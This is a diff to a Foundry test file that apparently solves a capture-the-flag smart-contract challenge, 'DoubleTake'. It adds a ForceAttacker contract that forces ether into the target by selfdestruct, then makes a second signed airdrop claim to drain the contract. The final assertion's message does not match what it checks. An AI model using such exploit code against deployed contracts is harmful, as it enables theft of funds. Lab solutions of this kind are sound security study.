@@ -15,7 +15,7 @@ contract DoubleTakeTest is Test, DeployDoubleTakeScript {
     address attacker = vm.addr(attackerPrivateKey);
 
     ClaimAirdropSignature sigUtils;
-
+    ForceAttacker forceAttacker;
 
     function setUp() public {
         vm.label(deployer, "Deployer");
@@ -26,11 +26,12 @@ contract DoubleTakeTest is Test, DeployDoubleTakeScript {
 
         sigUtils = new ClaimAirdropSignature();
         DeployDoubleTakeScript.run();
-
     }
 
     modifier beforeEach() {
         vm.startPrank(attacker);
+
+        assertEq(address(doubleTake).balance, 2 ether, "challenge balance should equal the full amount");
 
         ClaimAirdropSignature.ClaimAirdrop memory claim = ClaimAirdropSignature.ClaimAirdrop({
             user: 0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200,
@@ -38,10 +39,11 @@ contract DoubleTakeTest is Test, DeployDoubleTakeScript {
         });
 
         bytes32 digestClaim = sigUtils.getStructHash(claim);
-
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, digestClaim);
 
-         doubleTake.claimAirdrop(0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200, 1 ether, v, r, s);
+        doubleTake.claimAirdrop(0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200, 1 ether, v, r, s);
+
+        assertEq(address(doubleTake).balance, 1 ether, "challenge balance should equal balance after the first claim");
 
         vm.stopPrank();
         _;
@@ -50,16 +52,38 @@ contract DoubleTakeTest is Test, DeployDoubleTakeScript {
     function test_isSolved() public beforeEach {
         vm.startPrank(attacker);
 
+        forceAttacker = new ForceAttacker{value : 0.1 ether}(address(doubleTake));
+        forceAttacker.attack();
+
+        ClaimAirdropSignature.ClaimAirdrop memory claim = ClaimAirdropSignature.ClaimAirdrop({
+            user: 0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200,
+            amount: 1.1 ether
+        });
+
+        bytes32 digestClaim = sigUtils.getStructHash(claim);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, digestClaim);
+
+        doubleTake.claimAirdrop(0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200, 1.1 ether, v, r, s);
+        assertEq(address(attacker).balance, 0 ether, "challenge balance should equal zero");
+
         vm.stopPrank();
     }
+}
 
+contract ForceAttacker {
+    address target;
 
+    constructor(address _target) payable {
+        require(msg.value == 0.1 ether);
+        target = _target;
+    }
+
+    function attack() public {
+        selfdestruct(payable(target));
+    }
 }
 
 contract ClaimAirdropSignature {
-
-    constructor() {
-    }
 
     struct ClaimAirdrop {
         address user;
